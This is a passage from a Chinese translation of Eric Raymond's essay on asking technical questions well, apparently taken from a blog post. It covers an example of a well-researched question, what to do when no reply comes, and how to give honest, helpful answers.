X、Y 和 Z，当它们都失败后，又试了 A、B 和 C。注意我试 C 时的奇怪症状，显然某某东西正在做某某事情，这不是期望的行为。通常在 Athlon MP 主板上导致某某事情的原因是什么？有谁知道我还能再试点什么以确定问题？ 相反地，这个人看来值得回答。他或她展现了解决问题的能力而不是坐等天上掉馅饼。 在最后那个问题中，注意“给我一个回答”与“请帮我看看我还能再做点什么测试以得到启发”之间细微但重要的差别。 事实上，最后那个问题基本上源于 2001 年 8 月 Linux 内核邮件列表（lkml）上的真实事件，是我（Eric）当时提了那个问题，我发现 Tyan S2462 主板有神秘的死机现象，邮件列表成员给我提供了解决此问题的关键信息。 通过这种提问方式，我给了别人可以咀嚼玩味的东西。我设法使之对参与者既轻松又有吸引力，也表明了对同行能力的尊敬并邀请他们与我一起协商。通过告诉他们我已经走过的弯路，我还表明了对他们宝贵时间的尊重。 事后，当我感谢大家并评论这次良好的经历时，一个 Linux 内核邮件列表的成员谈到，他认为我得到答案并不是因为我的名字挂在列表上，而只是因为我正确的提问方式。 黑客们在某种方面是非常不留情面的精英分子。我想在这事上他是对的，如果我 表现得 象个不劳而获的寄生虫，不管我是谁都会被忽略或斥责。他建议将整个事件作为对其它人提问的指导，这直接导致了本文的编写。 如果得不到回答 如果得不到回答，请不要认为我们不想帮你，有时只是因为被问到的小组成员的确不知道答案。没有回复不等于不被理睬，当然必须承认从外面很难看出两者的差别。 一般而言，直接将问题再张贴一次不好，这会被视为毫无意义的骚扰。耐心一点，知道你问题答案的人可能生活在不同的时区，有可能正在睡觉，也有可能你的问题一开始就没有组织好。 还有其它资源可以寻求帮助，通常是在一些面向新手的资源中。 有许多在线与本地的用户组织，虽然它们自己不编写任何软件，但是对软件很热心。这些用户组通常因互助和帮助新手而形成。 还有众多大小商业公司提供签约支持服务，别因为要付点钱才有支持就感到沮丧！毕竟，如果你车子的汽缸垫烧了，你多半还得花钱找个修理店把它弄好。即使软件没花你一分钱，你总不能指望服务支持都是免费的。 象 Linux 这样流行的软件，每个开发者至少有一万个以上的用户，一个人不可能应付这么多用户的服务要求。记住，即使你必须付费才能得到支持，也比你还得额外花钱买软件要少得多（而且对封闭源代码软件的服务支持与开源软件相比通常还要贵一点，也要差一点）。 如何更好地回答 态度和善一点。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。 对初犯者私下回复。 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找 FAQ 都不知道。 如果你不确定，一定要说出来！ 一个听起来权威的错误回复比没有还要糟，别因为听起来象个专家好玩就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。 如果帮不了忙，别妨碍。 不要在具体步骤上开玩笑，那样也许会毁了用户的安装──有些可怜的呆瓜会把它当成真的指令。 探索性的反问以引出更多的细节。 如果你做得好，提问者可以学到点东西──你也可以。试试将很差的问题转变成好问题，别忘了我们都曾是新手。 尽管对那些懒虫报怨一声“读读该死的手册”（RTFM）是正当的，指出文档的位置（即使只是建议做个谷歌关键词搜索）会更好 如果你决意回答，给出好的答案。 当别人正在用错误的工具或方法时别建议笨拙的权宜之计，应推荐更好的工具，重新组织问题。 请回答真正的问题！如果提问者已经做了自己该做的研究，并且说明尝试过 X，Y，Z，A，B 与 C 都没有得到想要的結果，那么回复 试试 A 或 B 或者给出一个内容为 试一下 X，Y，Z，A，B 或 C 的链接将极其无益！ 帮助你的社区从中学习。当回复一个好问题时，问问自己 如何修改相关文件或 FAQ 文档以免再次解答同样的问题？，接着再向文档维护者发一份补丁。 如果你是在研究一番后才做出的回答，展现你的技巧而不是直接端出结果。毕竟“授人以鱼，不如授人以渔”。 相关资源 如果需要个人电脑、Unix 和互联网如何工作的基础知识，参阅 Unix 和互联网工作的基本原理。 当你发布软件或补丁时，试着按 软件发布实践 操作。 鸣谢 伊夫林.米切尔（Evelyn Mitchell）贡献了一些愚蠢问题例子并启发了编写如何更好地回答问题这一节，米哈伊尔.罗门迪克（Mikhail Ramendik）贡献了一些特别有价值的建议和改进。 ","link":"https://Xing-Fax.GitHub.io/post/how-to-ask/"}]}